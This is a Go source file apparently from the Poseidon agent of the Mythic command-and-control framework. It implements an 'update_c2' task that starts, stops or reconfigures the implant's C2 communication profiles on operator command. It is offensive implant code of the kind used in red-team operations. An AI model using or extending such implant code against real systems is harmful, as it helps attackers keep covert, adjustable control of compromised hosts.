package update_c2

import (
	"encoding/json"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	C2Name      string
	Action      string
	ConfigName  *string
	ConfigValue *string
}

func (e *Arguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["c2_name"]; ok {
		e.C2Name = v.(string)
	}
	if v, ok := alias["action"]; ok {
		e.Action = v.(string)
	}
	if v, ok := alias["config_name"]; ok {
		name := v.(string)
		e.ConfigName = &name
	}
	if v, ok := alias["config_value"]; ok {
		value := v.(string)
		e.ConfigValue = &value
	}
	return nil
}

// Run - Function that executes the run command
func Run(task structs.Task) {
	msg := task.NewResponse()
	args := Arguments{}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters. Reason: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	switch args.Action {
	case "start":
		profiles.StartC2Profile(args.C2Name)
		break
	case "stop":
		profiles.StopC2Profile(args.C2Name)
		break
	case "update":
		if args.ConfigValue == nil || args.ConfigName == nil {
			msg.SetError(fmt.Sprintf("Missing required parameter values for update: configValue and configName"))
			task.Job.SendResponses <- msg
			return
		}
		profiles.UpdateC2Profile(args.C2Name, *args.ConfigName, *args.ConfigValue)
		break
	default:
		msg.SetError(fmt.Sprintf("Unknown action: %s", args.Action))
		task.Job.SendResponses <- msg
		return
	}
	msg.Completed = true
	msg.Status = "completed"
	task.Job.SendResponses <- msg
	return

}
